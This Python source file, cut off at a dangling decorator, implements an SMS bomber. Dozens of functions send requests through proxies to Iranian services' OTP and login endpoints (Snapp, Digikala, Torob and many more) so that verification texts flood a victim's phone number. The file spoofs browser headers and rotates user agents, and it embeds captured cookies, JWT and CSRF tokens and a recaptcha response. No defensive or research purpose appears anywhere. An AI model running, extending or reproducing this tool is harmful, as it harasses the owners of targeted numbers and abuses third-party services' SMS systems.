from Plugins.my_handler import *
from requests import post, get
from user_agent import generate_user_agent



handler = Handler()

@handler.sms_api
def snapp(num, proxies):
        post(proxies=proxies, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            json={"cellphone": "+98"+num}, headers={"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"},)

@handler.sms_api
def tapsi(num, proxies):
    post(proxies=proxies, url="https://tap33.me/api/v2/user", 
                json={"credential":{"phoneNumber":f'0{num}',"role":"PASSENGER"}},)


@handler.sms_api
def torob(num, proxies):
    get(proxies=proxies, url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{num}',
                headers={"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"},)

@handler.sms_api
def alibaba(num, proxies):
    post(proxies=proxies, url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
                json={"phoneNumber":f'0{num}'},
                )
    

@handler.sms_api
def snapmarket(num, proxies):
    post(proxies=proxies, url="https://account.api.balad.ir/api/web/auth/login/",
                json={
                    "phone_number": f'0{num}',
                    "os_type": "W"
                },
    )


@handler.sms_api
def miareh(num, proxies): get(proxies=proxies, url=f'https://www.miare.ir/p/restaurant/#/login?phone=0{num}',)


@handler.sms_api
def ostadkar(num, proxies): post(proxies=proxies, url="https://api.ostadkr.com/login",json={"mobile": f'0{num}'},)


@handler.sms_api
def drnext(num, proxies):
            post(proxies=proxies, url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 
                json={
                    "source": "besina",
                    "mobile": f'0{num}'
                }, )


@handler.sms_api
def behtarino(num, proxies):        
    post(proxies=proxies, url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
                json={"phone": f'0{num}'},
            )

@handler.sms_api
def behtarino(num, proxies):
            post(proxies=proxies, url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
                json={"phone": f'0{num}'})

@handler.sms_api
def bit24(num, proxies):
    post(proxies=proxies, url='https://bit24.cash/auth/bit24/api/v3/auth/check-mobile',
                json={"mobile": f'0{num}',
                    "contry_code": "98"})             

@handler.sms_api
def drdr(num, proxies):
        post(proxies=proxies, url="https://drdr.ir/api/v3/auth/login/mobile/init",
                    json={"mobile": num})

@handler.sms_api
def drto(num, proxies):
    get("https://api.doctoreto.com/api/web/patient/v1/accounts/register",
                    json={
                        "mobile": num,
                        "captcha": "",
                        "country_id": 205
                    })

@handler.sms_api
def okala(num, proxies):
    post(proxies=proxies, url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",
                    json={"mobile": f'0{num}',
                            "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False},)    


@handler.sms_api
def banimod(num, proxies):
    post(proxies=proxies, url="https://mobapi.banimode.com/api/v2/auth/request",
                    json={"phone": f'0{num}' })

@handler.sms_api
def beroozmarket(num, proxies):
    post(proxies=proxies, url="https://api.beroozmart.com/api/pub/account/send-otp",
                    json={"mobile": f'0{num}', "sendViaSms": True, "email": "null", "sendViaEmail": False},)

@handler.sms_api
def itoll(num, proxies):
    post(proxies=proxies, url="https://app.itoll.com/api/v1/auth/login",
                    json={"mobile": f'0{num}'})

@handler.sms_api
def gap(num, proxies):
    get(proxies=proxies, url=f'https://core.gap.im/v1/user/add.json?mobile=%2B98{num}')

@handler.sms_api
def pinket(num, proxies):
    post(proxies=proxies, url="https://pinket.com/api/cu/v2/phone-verification",
                    json={"phoneNumber": f'0{num}'})
    

@handler.sms_api
def football360(num, proxies):
    post(proxies=proxies, url="https://football360.ir/api/auth/verify-phone/",
                    json={"phone_number": "+98"+num})

@handler.sms_api
def pinorest(num, proxies):
    post(proxies=proxies, url="https://api.pinorest.com/frontend/auth/login/mobile",
                    json={"mobile": f'{num}'})


@handler.sms_api
def mrbilit(num, proxies): get(proxies=proxies, url=f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{num}&source=2&sendTokenIfNot=true')

@handler.sms_api
def hamrahmechanich(num, proxies):
    post(proxies=proxies, url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
            json={"PhoneNumber":f'0{num}',"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","referrer":"https://www.google.com/"},)


@handler.sms_api
def lendo(num, proxies):
    post(proxies=proxies, url="https://api.lendo.ir/api/customer/auth/send-otp",
                    json={ "mobile": f'0{num}'},
            )

@handler.sms_api
def taghche(num, proxies):
    post(proxies=proxies, url="https://gw.taaghche.com/v4/site/auth/login",
                    json={"contact": f'0{num}', "forceOtp": False},
    )

@handler.sms_api
def fidibo(num, proxies):
    post("https://fidibo.com/user/login-by-sms", 
                    f'mobile_number={num}&country_code=ir&K1YwQTI0V2xtb3lZNGw0TDhDZm1SUT09=c0tjS0ViOTE2b5F1eE9MRjdLWEhodz09',
            )
    
@handler.sms_api
def khodro45(num, proxies):
    post(proxies=proxies, url="https://khodro45.com/api/v1/customers/otp/", 
                    json={"mobile": f'0{num}'},
                )

@handler.sms_api
def pateh(num, proxies):
    post(proxies=proxies, url="https://api.pateh.com/api/v1/LoginOrRegister",
                        json={"mobile": f'0{num}'}
                        ,
                        headers={
    "authority": "api.pateh.com",
    "method": "POST",
    "path": "/api/v1/LoginOrRegister",
    "scheme": "https",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
    "Content-Length": "24",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://www.pateh.com",
    "Referer": "https://www.pateh.com/",
    "Sec-Ch-Ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": generate_user_agent(os="win")
            })    

@handler.sms_api
def ketabchi(num, proxies):
    post(proxies=proxies, url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
                    json={"auth": {"phoneNumber": f'0{num}'}},
                    )

@handler.sms_api
def reyanertebet(num, proxies):
    post(proxies=proxies, url="https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",
                    json={"mobileNo": f'0{num}'},
                    )

@handler.sms_api
def bimito(num, proxies):
    post(proxies=proxies, url="https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
                    json={"phoneNumber": f'0{num}', "isResend": False},
                    )

@handler.sms_api
def pindo(num, proxies):
    post(proxies=proxies, url="https://api.pindo.ir/v1/user/login-register/",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def delino(num, proxies):
    post(proxies=proxies, url="https://www.delino.com/user/register",
                    json={ "mobile": f'0{num}'},
                    )

@handler.sms_api
def zoodex(num, proxies):
    post(proxies=proxies, url="https://admin.zoodex.ir/api/v1/login/check",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def kukala(num, proxies):
    post(proxies=proxies, url="https://api.kukala.ir/api/user/Otp", 
                    json={"phoneNumber": f'0{num}'},
                    )

@handler.sms_api
def baskol(num, proxies):
    post(proxies=proxies, url="https://www.buskool.com/send_verification_code",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def threetex(num, proxies):
    post(proxies=proxies, url="https://3tex.io/api/1/users/validation/mobile",
                    json={"receptorPhone": f'0{num}'},
                    )

@handler.sms_api
def deniizshop(num, proxies):
    post(proxies=proxies, url="https://deniizshop.com/api/v1/sessions/login_request",
                    json={"mobile_number": f'0{num}'},
                    )

@handler.sms_api
def flightio(num, proxies):
    post(proxies=proxies, url="https://flightio.com/bff/Authentication/CheckUserKey",
                    json={"userKey": f'0{num}'},
                    )

@handler.sms_api
def abantether(num, proxies):
    post(proxies=proxies, url="https://abantether.com/users/register/phone/send/",
                    json={"phoneNumber": f'0{num}'},
                    )

@handler.sms_api
def pooleno(num, proxies):
    post(proxies=proxies, url="https://api.pooleno.ir/v1/auth/check-mobile",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def wideapp(num, proxies):
    post(proxies=proxies, url="https://agent.wide-app.ir/auth/token",
                    json={"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": f'0{num}'},
            )

@handler.sms_api
def iranlms(num, proxies):
    post(proxies=proxies, url="https://messengerg2c4.iranlms.ir/",
                    json={"se": f'0{num}'},
                    )

@handler.sms_api
def classino(num, proxies):
    post(proxies=proxies, url="https://nx.classino.com/otp/v1/api/login",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def snappfood(num, proxies):
    post(proxies=proxies, url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
                    json={"cellphone": f'0{num}'},
                    )

@handler.sms_api
def bitbarg(num, proxies):
    post(proxies=proxies, url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def bahramshop(num, proxies):
    post(proxies=proxies, url="https://api.bahramshop.ir/api/user/validate/username",
                    json={"username": f'0{num}'},
                    )

@handler.sms_api
def tak(num, proxies):
    post(proxies=proxies, url="https://takshopaccessorise.ir/api/v1/sessions/login_request",
                    json={"mobile_phone": f'0{num}'},
                    )

@handler.sms_api
def chamedon(num, proxies):
    post(proxies=proxies, url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def kilid(num, proxies):
    post(proxies=proxies, url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def otaghak(num, proxies):
    post(proxies=proxies, url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
                    json={"userName": f'0{num}'},
                    )

@handler.sms_api
def shab(num, proxies):
    post(proxies=proxies, url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
                    json={"mobile": f'0{num}'},
                    )
    
@handler.sms_api
def raybit(num, proxies):
    post(proxies=proxies, url="https://api.raybit.net:3111/api/v1/authentication/register/mobile",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def farvi(num, proxies):
    post(proxies=proxies, url="https://farvi.shop/api/v1/sessions/login_request",
                    json={"mobile_phone": f'0{num}'},
                    )    

@handler.sms_api
def namava(num, proxies):
    post(proxies=proxies, url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                    json={"UserName": f'0{num}'},
                    )

@handler.sms_api
def a4baz(num, proxies):
    post(proxies=proxies, url="https://a4baz.com/api/web/login",
                    json={"cellphone": f'0{num}'},
                    )

@handler.sms_api
def anargift(num, proxies):
    post(proxies=proxies, url="https://api.anargift.com/api/people/auth",
                    json={"user": f'0{num}'},
                    )


@handler.sms_api
def nobat(num, proxies):
    post(proxies=proxies, url="https://nobat.ir/api/public/patient/login/phone",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def ayantech(num, proxies):
    post(proxies=proxies, url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
                    json={"Parametrs": {"ApplicationType": "Web","ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0","MobileNumber": f'0{num}' }},
                    )

@handler.sms_api
def simkhan(num, proxies):
    post(proxies=proxies, url="https://www.simkhanapi.ir/api/users/registerV2",
                    json={"mobileNumber": f'0{num}'},
                    )

@handler.sms_api
def sibirani(num, proxies):
    post(proxies=proxies, url="https://sandbox.sibirani.ir/api/v1/user/invite",
                    json={"username": f'0{num}'},
                    )

@handler.sms_api
def hyperjan(num, proxies):
    post(proxies=proxies, url="https://shop.hyperjan.ir/api/users/manage",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def digikala(num, proxies):
    post(proxies=proxies, url="https://api.digikala.com/v1/user/authenticate/",
            json={"username": f'0{num}'},
                    )

@handler.sms_api
def hiword(num, proxies):
    post(proxies=proxies, url="https://hiword.ir/wp-json/otp-login/v1/login",
                    json={"identifier": f'0{num}'},
                    )

@handler.sms_api
def tikban(num, proxies):
    post(proxies=proxies, url="https://tikban.com/Account/LoginAndRegister",
                    json={"cellPhone": f'0{num}'},
                    )


@handler.sms_api
def dicardo(num, proxies):
    post(proxies=proxies, url="https://dicardo.com/main/sendsms",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def digistyle(num, proxies):
    post(proxies=proxies, url="https://www.digistyle.com/users/login-register/",
                    json={"loginRegister[email_phone]": f'0{num}'},
                    )

@handler.sms_api
def banankala(num, proxies):
    post(proxies=proxies, url="https://banankala.com/home/login",
                    json={"Mobile": f'0{num}'},
                    )

@handler.sms_api
def offdecor(num, proxies):
    post(proxies=proxies, url="https://www.offdecor.com/index.php?route=account/login/sendCode",
                    json={"phone": f'0{num}'},
                    )

@handler.sms_api
def exo(num, proxies):
    post(proxies=proxies, url="https://exo.ir/index.php?route=account/mobile_login",
                    json={"mobile_number": f'0{num}'},
                    )

@handler.sms_api
def shahrefarsh(num, proxies):
    post(proxies=proxies, url="https://shahrfarsh.com/Account/Login",
                    json={"phoneNumber": f'0{num}'},
                    )

@handler.sms_api
def beheshticarpet(num, proxies):
    post(proxies=proxies, url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
                    json={"phone_email": f'0{num}'},
                    )

@handler.sms_api
def khanomi(num, proxies):
    post(proxies=proxies, url="https://www.khanoumi.com/accounts/sendotp",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def rojashop(num, proxies):
    post(proxies=proxies, url="https://rojashop.com/api/auth/sendOtp",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def dadpardaz(num, proxies):
    post(proxies=proxies, url="https://dadpardaz.com/advice/getLoginConfirmationCode",
                    json={"mobile": f'0{num}'},
                    )


@handler.sms_api
def rokla(num, proxies):
    post(proxies=proxies, url="https://api.rokla.ir/api/request/otp",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def khodro45(num, proxies):
    post(proxies=proxies, url="https://khodro45.com/api/v1/customers/otp/",
                    json={"mobile": f'0{num}'},
                    )

@handler.sms_api
def pezeshket(num, proxies):
    post(proxies=proxies, url="https://api.pezeshket.com/core/v1/auth/requestCode",
                    json={"mobileNumber": f'0{num}'},
                    )

@handler.sms_api
def virgool(num, proxies):
    post(proxies=proxies, url="https://virgool.io/api/v1.4/auth/verify",
                    json={"method": "phone", "identifier": f'0{num}'},
                    )

@handler.sms_api
def timcheh(num, proxies):
    post(proxies=proxies, url="https://api.timcheh.com/auth/otp/send",
                    json={"mobile": f'0{num}'},
                    )


@handler.sms_api
def paklean(num, proxies):
    post(proxies=proxies, url="https://client.api.paklean.com/user/resendCode",
                    json={"username": f'0{num}'},
                    )

@handler.sms_api
def daal(num, proxies):
    post(proxies=proxies, url="https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request"
        ,headers={ "Accept": "application/json",
                },
                json={ "phone": f"0{num}"})

@handler.sms_api
def bimebazar(num, proxies):
    post(proxies=proxies, url="https://bimebazar.com/accounts/api/login_sec/",
                json={ "username": f"0{num}"},
                )

@handler.sms_api
def azki(num, proxies):
    post(proxies=proxies, url="https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/",
                json={"phoneNumber": f"0{num}"},
                )

@handler.sms_api
def safarmarket(num, proxies):
    post(proxies=proxies, url="https://safarmarket.com//api/security/v2/user/otp",
                json={"phone": f"0{num}"},
                )

@handler.sms_api
def shad(num, proxies):
    shadH = {"Host": "shadmessenger12.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://shadweb.iranlms.ir", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://shadweb.iranlms.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shadD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": "098"+num, "send_type": "SMS"}}
    post(proxies=proxies, url="https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)

@handler.sms_api
def emtiaz(num, proxies):
    emH = {"Host": "web.emtiyaz.app", "Connection": "keep-alive", "Content-Length": "28", "Cache-Control": "max-age\u003d0", "Upgrade-Insecure-Requests": "1", "Origin": "https://web.emtiyaz.app", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": generate_user_agent(os="android"), "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://web.emtiyaz.app/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
    emD = "send=1&cellphone=0"+num
    post(proxies=proxies, url="https://web.emtiyaz.app/json/login", headers=emH, data=emD)

@handler.sms_api
def azinja(num, proxies):
        n4 = "------WebKitFormBoundarycIO8Y5lNAbbiVXKS\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n0"+num+"\r\n------WebKitFormBoundarycIO8Y5lNAbbiVXKS--\r\n"
        rhead = {"Host": "arzinja.app","content-type": "multipart/form-data; boundary=----WebKitFormBoundarycIO8Y5lNAbbiVXKS","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","accept": "application/json, text/plain, */*","sec-ch-ua-mobile": "?1","user-agent": generate_user_agent(os="android"),"sec-ch-ua-platform": "Android","origin": "https://arzinja.info","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://arzinja.info/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"}
        post(proxies=proxies, url="https://arzinja.app/api/login",data=n4, headers=rhead)


@handler.sms_api
def rubika(num, proxies):
    ruH = {"Host": "messengerg2c4.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://web.rubika.ir", "sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.rubika.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": num, "send_type": "SMS"}}
    post(proxies=proxies, url="https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)


@handler.sms_api
def bama(num, proxies):
    bamaH = {"Host": "bama.ir", "content-length": "22", "accept": "application/json, text/javascript, */*; q\u003d0.01", "x-requested-with": "XMLHttpRequest", "user-agent": generate_user_agent(os="android"), "csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE", "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8", "origin": "https://bama.ir", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
    bamaD = "cellNumber=0"+num
    post(proxies=proxies, url="https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)



@handler.sms_api
def digify(num, proxies):
    n4 = {"operationName":"Mutation","variables":{"content":{"phone_number":"0"+num}},"query":"mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}"}
    rhead = {"content-type": "application/json","accept": "*/*","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","user-agent": generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://register.digify.shop","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://register.digify.shop/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "233","host": "apollo.digify.shop"}
    post(proxies=proxies, url="https://apollo.digify.shop/graphql",json=n4, headers=rhead)


@handler.sms_api
def snappmarket(num, proxies):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{num}'
    smarketH = {'referer': 'https://snapp.market/','user-agent': generate_user_agent(os="linux")}
    post(proxies=proxies, url=smarketU, headers=smarketH)

@handler.sms_api
def chartex(num, proxies):

    arkaH = {"Host": "api.chartex.net", "User-Agent": generate_user_agent(os="win"), "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Origin, Accept, Content-Type, Authorization, Access-Control-Allow-Origin", "provider-code": "RUBIKA", "Authorization": "JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTgwMzU0NDEsImlhdCI6MTU5Nzg2MjY0MSwibmJmIjoxNTk3ODYyNjQxLCJhZCI6MTA2NDIxLCJpZCI6MTA2NDIyLCJyb2xlIjoiR1VFU1QiLCJzZXNzaW9uX2tleSI6ImxvZ2luX3Nlc3Npb25fMTA2NDIxXzEwNjQyMl9JQXdqUkZrTVBMUWhJeG5oSGFlQXdqVHciLCJwYyI6bnVsbCwiYyI6IklSUiJ9.wMAa_fI7VVBal8IhBeM-6wmGK4bDUOEj2fjoKhknyRk", "Cache-Control": "no-cache", "Plugin-version": "3.12.15", "Content-Type": "application/json;charset=utf-8", "Content-Length": "69", "Origin": "https://arkasafar.ir", "Connection": "keep-alive", "Referer": "https://arkasafar.ir/"}
    arkaD = {"mobile": "0" + num, "country_code": "IR", "provider_code": "RUBIKA"}
    post(proxies=proxies, url='https://api.chartex.net/api/v2/user/validate', headers=arkaH, json=arkaD)

@handler.sms_api
def snapptrip(num, proxies):
    sTripH = {"Host": "www.snapptrip.com", "User-Agent": generate_user_agent(os="win"), "Accept": "*/*", "Accept-Language": "fa", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json; charset=utf-8", "lang": "fa", "X-Requested-With": "XMLHttpRequest", "Content-Length": "134", "Origin": "https://www.snapptrip.com", "Connection": "keep-alive", "Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad", "TE": "Trailers"}
    sTripD = {"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + num, "country_code": "+98", "email": "example@gmail.com"}
    post(proxies=proxies, url='https://www.snapptrip.com/register',  headers=sTripH, json=sTripD)


@handler.sms_api
def okcs(num, proxies):
    rhead = {"user-agent": generate_user_agent()}
    get(proxies=proxies, url="https://okcs.com/users/mobilelogin?mobile=0" + num, headers=rhead)


@handler.sms_api
def takshopaccessorise(num, proxies):
    n4 = {"mobile_phone": "0"+num}
    post(proxies=proxies, url="https://takshopaccessorise.ir/api/v1/sessions/login_request",json=n4)

@handler.sms_api
def bitpin(num, proxies):
    n4 = {"phone": "0"+num,"captcha_token": ""}
    rhead = {"content-type": "application/json","accept": "application/json, text/plain, */*","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","user-agent": generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://bitpin.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://bitpin.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "42","host": "api.bitpin.ir"}
    post(proxies=proxies, url="https://api.bitpin.ir/v1/usr/sub_phone/",json=n4, headers=rhead)

@handler.sms_api
def publisha(num, proxies):
    rhead = {"user-agent": generate_user_agent()}
    pubisha_request = "mobile=0"+num
    pubisha_url = 'https://www.pubisha.com/login/checkCustomerActivation'
    post(pubisha_url, json=pubisha_request, headers=rhead)

@handler.sms_api
def wisgoon(num, proxies):

    post("https://gateway.wisgoon.com/api/v1/auth/login/",json={"phone": "0"+num, "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg","token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"}, headers={"Host": "gateway.wisgoon.com","content-length": "582","accept": "application/json","save-data": "on","user-agent": generate_user_agent(os="android"),"content-type": "application/json","origin": "https://m.wisgoon.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.wisgoon.com/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7", }, timeout=5)

@handler.sms_api
def snappdoctor(num, proxies):
    rhead = {"user-agent": generate_user_agent()}
    get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{num}/sms?cCode=+98', headers=rhead, timeout=5)

@handler.sms_api
